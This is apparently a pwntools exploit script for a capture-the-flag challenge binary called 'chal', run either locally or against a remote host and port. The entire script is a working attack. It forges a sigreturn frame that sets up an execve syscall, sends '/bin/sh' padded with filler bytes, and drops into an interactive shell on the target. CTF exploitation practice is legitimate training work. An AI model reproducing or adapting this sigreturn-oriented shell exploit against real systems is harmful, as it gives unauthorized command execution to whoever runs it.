from pwn import *
import sys

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

elf = context.binary = ELF('./chal')
context.os = 'linux'
context.arch = 'amd64'

if len(sys.argv) > 1 :
    p = remote(sys.argv[1], sys.argv[2])
else:
    p = process('./chal')

frame = SigreturnFrame()

frame.rip = 0x401019
frame.rax = 59
frame.rdi = 0x4020b0
frame.rsi = 0
frame.rdx = 0

p.sendlineafter('anything...\n',bytes(frame))

p.recvuntil('Figures.\n')

payload = b'/bin/sh\x00' + 7 * b'A'
p.send(payload)

p.interactive()